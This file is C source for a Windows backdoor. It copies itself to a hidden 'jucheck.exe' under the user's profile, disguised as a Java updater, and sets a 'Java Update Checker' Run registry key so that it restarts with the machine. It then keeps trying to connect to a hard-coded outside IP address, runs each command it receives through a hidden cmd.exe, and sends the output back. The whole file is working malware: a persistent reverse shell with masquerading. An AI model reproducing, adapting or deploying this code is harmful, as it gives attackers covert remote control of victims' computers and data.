#include <winsock2.h>
#include <ws2tcpip.h>
#include <Strsafe.h>
#include <Shlobj_core.h>

// Winsock lib
#pragma comment(lib, "Ws2_32.lib")

#define BUFSIZE 1024
#define RET_AND_WSCLEAN WSACleanup(); \
						return 1;

#define HOSTNAME L"149.28.152.215"
#define PORT L"9090"
// wait for 30 seconds
#define WAIT_FOR 3000	
#define PROMPT "> "

wchar_t const* mutexName = L"BackdoorMutex";
wchar_t const* runKeyName = L"Java Update Checker";

// do persistence and delete itself
// unreliable code
void install() {
	PWSTR homeAt;
	wchar_t installedAt[BUFSIZE];
	wchar_t currentFilePath[BUFSIZE];
	wchar_t newFilePath[BUFSIZE];
	

	HANDLE hMutex = NULL;
	// ensure only one instance
	if ((hMutex = CreateMutex(
		NULL,              // default security attributes
		FALSE,             // initially not owned
		mutexName))!= NULL && GetLastError() == ERROR_ALREADY_EXISTS){
		ExitProcess(1);
	}
	if (!GetModuleFileName(NULL, currentFilePath, BUFSIZE)) {
		return;
	}
	if (wcsstr(currentFilePath, L"\\.java\\Java Update\\jucheck.exe")) {	// already
		return;
	}
	if (SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &homeAt) != S_OK) {
		return;
	}
	StringCchPrintf(installedAt, BUFSIZE, L"%s\\.java\\Java Update", homeAt);
	CoTaskMemFree(homeAt);
	// create dir
	SHCreateDirectoryEx(NULL, installedAt, NULL);

	StringCchPrintf(newFilePath, BUFSIZE, L"%s\\jucheck.exe", installedAt);
	// move executable file
	if (!MoveFileEx(currentFilePath, newFilePath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING)) {
		return;
	}

	// make hidden file
	if (!SetFileAttributes(newFilePath, FILE_ATTRIBUTE_HIDDEN)) {
		return;
	}

	HKEY hRunKey = NULL;
	// persistence using run key
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hRunKey) != ERROR_SUCCESS) {
		return;
	}
	if (RegSetValueEx(hRunKey, runKeyName, 0, REG_SZ, (PBYTE)newFilePath, sizeof(wchar_t) * wcslen(newFilePath)) != ERROR_SUCCESS) {
		RegCloseKey(hRunKey);
		return;
	}
	RegCloseKey(hRunKey);
}

// print pretty error message
void printError(wchar_t const* msg, int errCode){
	wchar_t buffer[BUFSIZE];
	wchar_t* formatted = NULL;

	int nread = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errCode, 0, (LPWSTR)&formatted, 0, NULL);
	if (nread == 0) {
		wsprintf(buffer, L"%s (0x%x)\n", msg, errCode);
	} else {
		formatted[nread] = NULL;
		wsprintf(buffer, L"%s: %s\n", msg, formatted);
	}
	MessageBox(NULL, buffer, L"ERROR", MB_OK);
	LocalFree(formatted);
}

// try to connect to the server
SOCKET tryConnect(ADDRINFOW* addrInfo) {
	SOCKET sock = INVALID_SOCKET;

	// Create a SOCKET for connecting to server
	if ((sock = socket(addrInfo->ai_family, addrInfo->ai_socktype, addrInfo->ai_protocol)) == INVALID_SOCKET) {
		return INVALID_SOCKET;
	}
	// Connect to server.
	if (connect(sock, addrInfo->ai_addr, (int)addrInfo->ai_addrlen) == SOCKET_ERROR) {
		return INVALID_SOCKET;
	}
	return sock;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	int ret;
	WSADATA wsaData;	//  information about the Windows Sockets implementation
	ADDRINFOW* addrInfo = NULL;
	ADDRINFOW hints;
	SOCKET sock = INVALID_SOCKET;
	char command[BUFSIZE];
	wchar_t commandline[BUFSIZE];
	char result[BUFSIZE];	// command's result
	int nsent = 0;
	int nrecv = 0;
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	SECURITY_ATTRIBUTES pipeAttr;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;

	install();

	// Initialize Winsock
	if ((ret = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0) {
		printError(L"Failed to initialize Winsock to use", ret);
		return 1;
	}

	ZeroMemory(&hints, sizeof(ADDRINFOW));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if ((ret = GetAddrInfoW(HOSTNAME, PORT, &hints, &addrInfo)) != 0) {
		printError(L"In GetAddrInfoW", ret);
		RET_AND_WSCLEAN
	}

	while ((sock=tryConnect(addrInfo)) == INVALID_SOCKET) {
		Sleep(WAIT_FOR);
	}
	FreeAddrInfoW(addrInfo);
	
	while (TRUE) {
		// Shell prompt
		if ((nsent = send(sock, PROMPT, strlen(PROMPT), 0))==SOCKET_ERROR) {
			printError(L"In send", ret);
			closesocket(sock);
			RET_AND_WSCLEAN
		}
		if ((nrecv = recv(sock, command, BUFSIZE - 1, 0)) == SOCKET_ERROR) {
			printError(L"In recv", ret);
			closesocket(sock);
			RET_AND_WSCLEAN
		}
		// The peer server closed
		if (!nrecv) {
			break;
		}
		command[nrecv] = NULL;
		StringCchPrintf(commandline, BUFSIZE, L"cmd.exe /C %S", command);

		// Using anonymous PIPE to get command's result
		ZeroMemory(&pipeAttr, sizeof(SECURITY_ATTRIBUTES));
		pipeAttr.bInheritHandle = TRUE;
		pipeAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		
		// For stdout
		if (!CreatePipe(&hReadPipe, &hWritePipe, &pipeAttr, 0)) {
			printError(L"In CreatePipe", GetLastError());
			closesocket(sock);
			RET_AND_WSCLEAN
		}
		// Read side of the pipe is not inheritable
		if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
			printError(L"In SetHandleInformation", GetLastError());
			closesocket(sock);
			RET_AND_WSCLEAN
		}
		
		ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
		ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
		// specify stdout handle
		startupInfo.cb = sizeof(STARTUPINFO);
		startupInfo.hStdOutput = hWritePipe;
		startupInfo.hStdError = hWritePipe;
		startupInfo.wShowWindow = SW_HIDE;
		startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		// Open process for executing the command
		if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", commandline,
			NULL, NULL, TRUE, 0,
			NULL, NULL,
			&startupInfo, &procInfo)) {
			printError(L"In CreateProcess", GetLastError());
			closesocket(sock);
			RET_AND_WSCLEAN
		}
		// Close unnecessary handles (important for ReadFile to return 0)
		CloseHandle(hWritePipe);
		
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);

		// Read command's output
		DWORD nread = 0;
		while (ReadFile(hReadPipe, result, BUFSIZE, &nread, NULL) > 0 && nread>0) {	// Echo back to server
			if ((nsent = send(sock, result, nread, 0)) == SOCKET_ERROR || (nread!=nsent)) {
				printError(L"In send", ret);
				closesocket(sock);
				RET_AND_WSCLEAN
			}
		}
	}

	closesocket(sock);
	WSACleanup();
	return 0;
}